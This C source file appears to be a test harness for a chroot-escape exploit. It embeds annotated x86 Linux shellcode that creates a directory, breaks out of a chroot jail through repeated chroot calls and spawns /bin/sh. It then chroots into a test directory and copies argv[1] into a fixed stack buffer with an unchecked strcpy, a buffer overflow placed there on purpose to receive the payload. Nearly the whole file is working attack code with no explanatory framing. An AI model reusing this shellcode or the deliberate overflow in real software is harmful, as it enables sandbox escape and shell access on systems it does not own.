#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
 char shellcode[]=
   "\xeb\x57"                      /* jmp 0x4f              */
   "\x31\xc0"                      /* xorl %eax,%eax        */
   "\x31\xc9"                      /* xorl %ecx,%ecx        */
   "\x5e"                          /* popl %esi             */
   "\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
   "\xb0\x27"                      /* movb $0x27,%al        */
   "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
   "\xfe\xc5"                      /* incb %ch              */
   "\xb1\xed"                      /* movb $0xed,%cl        */
   "\xcd\x80"                      /* int $0x80             */
   "\x31\xc0"                      /* xorl %eax,%eax        */
   "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
   "\xb0\x3d"                      /* movb $0x3d,%al        */
   "\xcd\x80"                      /* int $0x80             */
   "\x31\xc0"                      /* xorl %eax,%eax        */
   "\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
   "\xf7\xdb"                      /* negl %ebx             */
   "\x31\xc9"                      /* xorl %ecx,%ecx        */
   "\xb1\x01"                      /* movb $0x01,%cl        */
   "\x56"                          /* pushl %esi            */
   "\x89\x5e\x08"                  /* movl %ebx,0x8(%esi)   */
   "\x83\xc6\x03"                  /* addl %0x3,%esi        */
   "\xe0\xf8"                      /* loopne -0x8           */
   "\x5e"                          /* popl %esi             */
   "\xb0\x3d"                      /* movb $0x3d,%al        */
   "\x8d\x5e\x08"                  /* leal 0x8(%esi),%ebx  */
   "\xcd\x80"                      /* int $0x80             */
   "\x31\xc0"                      /* xorl %eax,%eax        */
   "\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
   "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
   "\xb0\x0b"                      /* movb $0xb,%al         */
   "\x89\xf3"                      /* movl %esi,%ebx        */
   "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
   "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
   "\xcd\x80"                      /* int $0x80             */

   "\x8d\x46\xcc"                  /* leal 0xffffffcc(%esi),%eax */
   "\x8a\x18"                      /* movb (%eax),%bl       */
   "\xfe\xc3"                      /* incb %bl              */
   "\x88\x18"                      /* movb %bl,(%eax)       */

   "\xe8\xa4\xff\xff\xff"          /* call -0x54            */
   "/bin/sh";                      /* .string \"/bin/sh\"   */

  char buffer[1024];
  chroot("/home/heiko/test");
  chdir("/");
 
  printf("shellcode adress 0x%lx\n",shellcode); 
  
  if(argc > 1)
    strcpy(buffer,argv[1]);
}
